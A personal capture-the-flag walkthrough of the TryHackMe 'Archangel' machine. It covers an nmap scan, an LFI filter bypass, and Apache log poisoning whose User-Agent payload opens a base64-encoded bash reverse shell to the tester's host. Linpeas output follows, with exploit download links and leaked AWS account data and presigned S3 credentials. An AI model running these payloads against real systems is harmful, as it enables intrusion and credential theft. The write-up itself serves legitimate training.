we have ![[Pasted image 20251021130511.png]] #GTFOBins- #Priv2Admin #web [[NMAP]] [[Feroxbuster]] [[Privilege Escalation Linux]]
this questions and start from machine scan with nmap
results of scaning:
```shell
┌──(user㉿kali)-[~]
└─$ nmap -A -T4 -p1-1000 10.10.113.235
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 13:08 +07
Nmap scan report for 10.10.113.235
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   115.70 ms 10.11.0.1
2   116.87 ms 10.10.113.235

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds
```
we know that open 2 ports 22 and 80, lets check `http://10.10.113.235` ![[Pasted image 20251021131422.png]]
firs domen what i saw it's in mail mafialive.thm, add in `/etc/hosts`
![[Pasted image 20251021132655.png]]
next lets check this endpoint with feroxbuster 
```shell
feroxbuster -u http://mafialive.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,zip,tar,conf,inc -t 200 -s 200,204,301,302,403
```
results:
```shell

```
we find endpoints `robots.txt` `test.php` 
`robots.txt`:
![[Pasted image 20251021180716.png]]
we find endpoint `test.php agian`
![[Pasted image 20251021133706.png]]
we have button and nothing interesting in html or another data, lets click
![[Pasted image 20251021134016.png]]
we find new endpoint with strange way, must explorer more because "Control is an ilussion"
try ti get a cod of mrrobots.php with `php://filter` we will encode mrrobot.php in base64 and php code will dont execute, url with payload
```URL
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
```
result: 
```base64
PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==
```
Now we have LFI - Local File Inclusion 
convert result in base64 and we take:
```php
<?php echo 'Control is an illusion'; ?>
```
mrrobot just print "Control is an illusion"
after this i want to take passwd but i cant did it always was 
![[Pasted image 20251021183733.png]]
and i decided take a code of test.php
payload URL
```URL
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
code in base64
```base64
CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==
```
decoded:
```php
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>
```
now we see a logic of a page and reverse it, we can see what test.php `include` when two if is true
first: when we havent got in our payload ../.. we 'cant' change the directory and 
second: path must contain `/var/www/html/development_testing` 
and if everething okay we can use our LFI 
`include $_GET['view'];` include so dadngerous because we can control file what will be include(за счет подключения файла мы сами управляем тем что исполнится при соблюдении условий)
we can scam filters 
example: `..//..` for linux will be similar with `../..`
and we can go everywhere
now i want to take `/etc/passwd`
```URL
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//..//etc//passwd
```
Result:
```base64 
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KdXVpZGQ6eDoxMDU6MTA5OjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDY6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgphcmNoYW5nZWw6eDoxMDAxOjEwMDE6QXJjaGFuZ2VsLCwsOi9ob21lL2FyY2hhbmdlbDovYmluL2Jhc2gK
 ```
Decoded version:
```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```
we have `root` and `archangel` how users now time to revers shell
i tried a lot of ways to start RS but worked onle one:
1.First we must send our php code to execute in php file, one file what we can write its logfile and we can opened it from our LFI
payload to see access.logs
```shell
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//var//log//apache2//access.log
```
after i used this
```HTTP
GET http://mafialive.thm/ HTTP/1.1
Host: mafialive.thm
User-Agent: "<?php -r '$sock=fsockopen("10.11.147.65",8000);shell_exec("bash <&3 >&3 2>&3");' ?>"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
```HTTP
GET http://mafialive.thm/ HTTP/1.1
Host: mafialive.thm
User-Agent: "<?php -r '$sock=fsockopen("10.11.147.65",8000);system("bash <&3 >&3 2>&3");' ?>"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
but its doesnt working, after i tried encode this to base 64 and decode then php exec and i take this payload:
```HTTP
GET http://mafialive.thm/ HTTP/1.1
Host: mafialive.thm
User-Agent: "<?php system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS4xNDcuNjUvOTAwMSAwPiYx | base64 -d | bash'); ?>"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
and its worked, I cant find another payload
![[Pasted image 20251022172531.png]]
take our next flag and try take archangel user
![[Pasted image 20251022172704.png]]
next step i download on machine linpeas.sh from our http server
![[Pasted image 20251022173325.png]]
make it executable and start scan
```Shell
www-data@ubuntu:/tmp$ ./linpeas.sh
./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |     
    |---------------------------------------------------------------------------------|     
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |     
    |         Follow on Twitter         :     @hacktricks_live                        |     
    |         Respect on HTB            :     SirBroccoli                             |     
    |---------------------------------------------------------------------------------|     
    |                                 Thank you!                                      |     
    \---------------------------------------------------------------------------------/     
          LinPEAS-ng by carlospolop                                                         
                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                      
                                                                                            
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html                                                                      
 LEGEND:                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════         
                               ╚═══════════════════╝                                        
OS: Linux version 4.15.0-123-generic (buildd@lcy01-amd64-017) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: ubuntu

[+] /bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)                                                                                       
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                     
[+] /bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                                                          
                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe                                                
DONE
                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════          
                              ╚════════════════════╝                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                                                       
Linux version 4.15.0-123-generic (buildd@lcy01-amd64-017) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.5 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                                          
Sudo version 1.8.21p2                                                                       


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                                                  
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                

╔══════════╣ Date & uptime
Wed Oct 22 16:04:24 IST 2025                                                                
 16:04:24 up 11 min,  0 users,  load average: 0.15, 0.09, 0.08

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                   
UUID=2b75cebe-8609-45cd-9ec7-69ab0b3391da       /       ext4    errors=remount-ro       0 1 

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                        

╔══════════╣ Environment
╚ Any private information inside environment variables?                                     
SHLVL=2                                                                                     
OLDPWD=/home/archangel
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
_=./linpeas.sh
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                                                   
dmesg Not Found                                                                             
                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                          
cat: write error: Broken pipe                                                               
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                    
═╣ PaX bins present? .............. PaX Not Found                                           
═╣ Execshield enabled? ............ Execshield Not Found                                    
═╣ SELinux enabled? ............... sestatus Not Found                                      
═╣ Seccomp enabled? ............... disabled                                                
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (kvm)                                               

╔══════════╣ Kernel Modules Information
══╣ Kernel modules with weak perms?                                                         
                                                                                            
══╣ Kernel modules loadable? 
Modules can be loaded                                                                       



                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════         
                                   ╚═══════════╝                                            
╔══════════╣ Container related tools present (if any):
/sbin/apparmor_parser                                                                       
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/sbin/capsh
/sbin/setcap
/sbin/getcap

╔══════════╣ Container details
═╣ Is this a container? ........... No                                                      
═╣ Any running containers? ........ No                                                      
                                                                                            


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════         
                                     ╚═══════╝                                              
grep: /etc/motd: No such file or directory
Learn and practice cloud hacking techniques in https://training.hacktricks.xyz
                                                                                            
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-04403b828bc55d6b0                                                               
instance-action: none
instance-id: i-040a3754a4873391f
instance-life-cycle: on-demand
instance-type: t3a.micro
region: eu-west-1

══╣ Account Info
{                                                                                           
  "Code" : "Success",
  "LastUpdated" : "2025-10-22T10:22:43Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:f4:49:8e:08:c7/                                                                     
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
                                                                                            

══╣ User Data
Content-Type: multipart/mixed; boundary="==BOUNDARY=="                                      
MIME-Version: 1.0


--==BOUNDARY==
Content-Type: text/cloud-config
MIME-Version: 1.0

#cloud-config
bootcmd:
  - 'echo "userId: 63df3282d137d3004967a9dd" > /.badr-info'
  - 'echo "uploadId: 5fb7a707de94321596e6f215" >> /.badr-info'
  - 'echo "roomId: 5fb54256118e7d448502d7ce" >> /.badr-info'
  - 'echo "roomCode: archangel" >> /.badr-info'
  - 'echo "taskId: 5fb542934b9b764491f37a35" >> /.badr-info'
  - 'echo "instanceId: 68f8b07e5da9967b055edec1" >> /.badr-info'
  - 'mkdir /etc/badr'

runcmd:
  - 'wget -O /etc/badr/badr "https://tryhackme-vm-deployment.s3.eu-west-1.amazonaws.com/badr?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQMWLXEMXW4%2F20251022%2Feu-west-1%2Fs3%2Faws4_request&X-Amz-Date=20251022T102255Z&X-Amz-Expires=480&X-Amz-Signature=26ce64ef37fc8fee7463ad34390351f7759f80e932fb40ca0c39827ac20dfdec&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
  - 'wget -O /etc/badr/config.yaml "https://tryhackme-vm-deployment.s3.eu-west-1.amazonaws.com/config.yaml?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQMWLXEMXW4%2F20251022%2Feu-west-1%2Fs3%2Faws4_request&X-Amz-Date=20251022T102255Z&X-Amz-Expires=480&X-Amz-Signature=6cfb0b130c99ae55fe1ca7d6dd172ed15f4800157f059876e6fc1fb214ca5587&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
  - 'wget -O /etc/badr/rules.yaml "https://tryhackme-vm-deployment.s3.eu-west-1.amazonaws.com/rules.yaml?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQMWLXEMXW4%2F20251022%2Feu-west-1%2Fs3%2Faws4_request&X-Amz-Date=20251022T102255Z&X-Amz-Expires=480&X-Amz-Signature=6cfe433c6d085acf4a8c8246ca4f785ee13eefdcfd6c5696d265c085146fce47&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
  - 'wget -O /etc/badr/room.config.yaml "https://tryhackme-vm-deployment.s3.eu-west-1.amazonaws.com/archangel/rules.yaml?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQMWLXEMXW4%2F20251022%2Feu-west-1%2Fs3%2Faws4_request&X-Amz-Date=20251022T102255Z&X-Amz-Expires=480&X-Amz-Signature=ae66674265db08db40ed92e2f7b44194465612c97ca681b85b7736cb473fca50&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
  - 'wget -O /etc/systemd/system/badr.service "https://tryhackme-vm-deployment.s3.eu-west-1.amazonaws.com/badr.service?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQMWLXEMXW4%2F20251022%2Feu-west-1%2Fs3%2Faws4_request&X-Amz-Date=20251022T102255Z&X-Amz-Expires=480&X-Amz-Signature=9eb126c17c981db8a3ee60070f2b3090607f64554243e40417be4bb5dcf1edeb&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
  - 'systemctl daemon-reload'
  - 'systemctl enable badr.service'
  - 'systemctl start badr.service'
 
